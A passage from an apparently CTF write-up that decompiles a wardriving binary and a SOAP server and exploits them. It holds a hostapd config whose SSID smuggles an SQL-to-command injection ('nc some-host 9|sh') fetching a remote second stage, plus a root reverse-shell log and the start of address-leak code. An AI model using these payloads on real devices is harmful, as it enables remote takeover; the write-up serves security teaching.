</span><span class="token number">0LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">__int64 __fastcall </span><span class="token function" style="color:rgb(80, 250, 123)">insert</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">__snprintf_chk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        v8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">256LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">256LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">"INSERT INTO wifis VALUES(%d, '%s', '%s', '%s');"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        _id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> bss_str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> ssid_str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> signal_str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we create an malicious AP, the SSID will be formatted into this INSERT command. We can use this to perform an SQL insert injection into the database, allowing us to control any field of a new entry to the <code>wifis</code> table.</p>
<p>Next we look at the second functionality. The binary will periodically dump values from the table and send them as data using a curl command:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">__int64 </span><span class="token function" style="color:rgb(80, 250, 123)">dump</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  v0 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sqlite3_exec</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">v3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"SELECT * FROM wifis"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> callback</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">__int64 __fastcall </span><span class="token function" style="color:rgb(80, 250, 123)">callback</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"> bss_str </span><span class="token operator">&amp;&amp;</span><span class="token plain"> signal_str </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">__snprintf_chk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">128LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">128LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token string" style="color:rgb(255, 121, 198)">"curl %s --data \"{\\\"bss\\\": \\\"%s\\\", \\\"signal\\\": \\\"%s\\\"}\""</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token string" style="color:rgb(255, 121, 198)">"http://127.0.0.1:8080/logs"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      bss_str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> signal_str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token number">0LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token number">1LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can see that there is no sanitization of the <code>bss</code> or <code>signal</code> columns when formatted into the command. We can trigger command injection here by creating a malicious wifi entry using the SQL injection in the previous function. The length of command injection in the SSID is limited, so I fetched a second stage from a remote host. Here is the <code>hostapd</code> config with the SQL injection payload:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">interface</span><span class="token operator">=</span><span class="token plain">wlan4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">driver</span><span class="token operator">=</span><span class="token plain">nl80211</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hw_mode</span><span class="token operator">=</span><span class="token plain">a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">channel</span><span class="token operator">=</span><span class="token number">48</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssid</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">',''),(2,'</span><span class="token identifier punctuation" style="color:rgb(248, 248, 242)">`</span><span class="token identifier">nc some-host 9|sh</span><span class="token identifier punctuation" style="color:rgb(248, 248, 242)">`</span><span class="token string" style="color:rgb(255, 121, 198)">','</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wpa</span><span class="token operator">=</span><span class="token number">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wpa_key_mgmt</span><span class="token operator">=</span><span class="token plain">SAE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wpa_pairwise</span><span class="token operator">=</span><span class="token plain">CCMP</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ap_isolate</span><span class="token operator">=</span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sae_password</span><span class="token operator">=</span><span class="token plain">shred_the_gnar_pow</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After a few seconds the wardriver picks up our AP and we get a connect back on the second target!</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ nc -l 1338 -v</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Listening on 0.0.0.0 1338</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection received on 192.168.1.2 58580</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: cannot set terminal process group (8): Inappropriate ioctl for device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: no job control in this shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@b976e8a2f52b:/# cat flag2.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat flag2.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">turtles{f0c03d9e242a89f1df51e5da9a833750398fe989}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@b976e8a2f52b:/#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag-3">Flag 3<a href="https://www.supernetworks.org/pages/blog/january-2023-turtles#flag-3" class="hash-link" aria-label="Direct link to Flag 3" title="Direct link to Flag 3">​</a></h2>
<p>For the final target, we need to exploit an SOAP Server running on the second AP. Our second target box is already authenticated to the AP, so we can easily talk to the server directly.</p>
<p>Decompiling the binary, we see that it is a simple HTTP server which implements a few parts of the <a href="https://en.wikipedia.org/wiki/SOAP" target="_blank" rel="noopener noreferrer">SOAP protocol</a>. We can perform a some actions such as listing the server uptime or date.</p>
<p>The first bug I found was in an error handler. This handler uses the <code>http_response</code> function to build a response with HTTP code 400. However for the body pointer, it mistakenly passes a <code>void**</code> pointer instead of a <code>char*</code> ptr. This will leak the address of the <code>soap_action</code> function as well as a stack address in the body of the 400 response.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> __cdecl </span><span class="token function" style="color:rgb(80, 250, 123)">http_response</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">fprintf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">stream</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"HTTP/1.1 %d %s\r\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> a2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> a3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">fwrite</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Server: OS/Version UPnP/1.0 product/version"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1u</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x2Bu</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> stream</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">fwrite</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Content-Type: text/html\r\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1u</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x19u</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> stream</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">fwrite</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Connection: close\r\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1u</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x13u</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> stream</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">fwrite</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"\r\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1u</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2u</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> stream</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">fprintf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">stream</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;%d %s&lt;/TITLE&gt;&lt;/HEAD&gt;\n&lt;H4&gt;%d %s&lt;/H4&gt;\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> a2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> a3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> a2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> a3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> __cdecl </span><span class="token function" style="color:rgb(80, 250, 123)">handle_client</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> fd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token operator">*</span><span class="token plain"> __soap_action_ </span><span class="token operator">=</span><span class="token plain"> soap_action</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">v7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">2048</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  v7 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">buf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">_isoc99_sscanf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">__soap_action</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">steam</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">http_response</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">stream</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">400</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Invalid request"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">const</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> </span><span class="token operator">*</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token operator">&amp;</span><span class="token plain">__soap_action_</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can trigger this leak with the following code:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sock </span><span class="token operator">=</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">HOST</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> PORT</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sendall</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">b'ENDEND a\n'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">leak </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">sock</span><span class="token punctuation" 